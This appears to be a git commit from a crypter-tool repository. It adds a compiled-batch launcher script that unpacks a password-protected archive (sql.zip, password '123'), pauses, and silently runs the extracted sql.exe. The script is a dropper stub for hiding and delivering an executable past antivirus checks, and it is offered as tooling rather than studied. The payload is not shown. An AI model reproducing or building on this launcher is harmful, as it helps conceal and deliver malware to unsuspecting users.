da625b437ce4c52ea57dc3b41177b23e94a8d05e
rezaduty <reza.duty.persian@gmail.com>
2019-06-07 10:23:37 +0430

    add crypter

---
+++ Crypter/0w/mb72encrypting files/EncryptedFile_beta.bat
@@ -0,0 +1,21 @@
+ECHO OFF
+REM  QBFC Project Options Begin
+REM  HasVersionInfo: No
+REM  Companyname: 
+REM  Productname: 
+REM  Filedescription: 
+REM  Copyrights: 
+REM  Trademarks: 
+REM  Originalname: 
+REM  Comments: 
+REM  Productversion:  0. 0. 0. 0
+REM  Fileversion:  0. 0. 0. 0
+REM  Internalname: 
+REM  Appicon: 
+REM  QBFC Project Options End
+ECHO ON
+@echo off
+ur e -p123 sql.zip
+PING 127.0.0.1 -n 3
+start sql.exe
+exit
